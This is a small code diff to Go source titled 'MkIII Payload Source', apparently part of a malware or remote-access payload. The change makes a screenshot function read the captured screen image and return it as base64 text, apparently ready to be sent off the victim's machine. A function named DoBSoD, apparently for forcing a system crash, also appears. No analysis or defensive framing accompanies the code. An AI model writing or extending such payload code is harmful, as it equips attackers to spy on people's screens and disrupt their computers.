@@ -9,6 +9,7 @@ MkIII Payload Source
 package main
 
 import (
+	"encoding/base64"
 	"fmt"
 	"github.com/vova616/screenshot"
 	"image/png"
@@ -89,7 +90,9 @@ func GetScreenShot() string {
 	}
 	var _ = f.Close()
 
-	return TempFileDir + "\\CAPTURE.png"
+	data, _ := os.ReadFile(TempFileDir + "\\CAPTURE.png")
+
+	return strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(data)), "=", "")
 }
 
 func DoBSoD() {
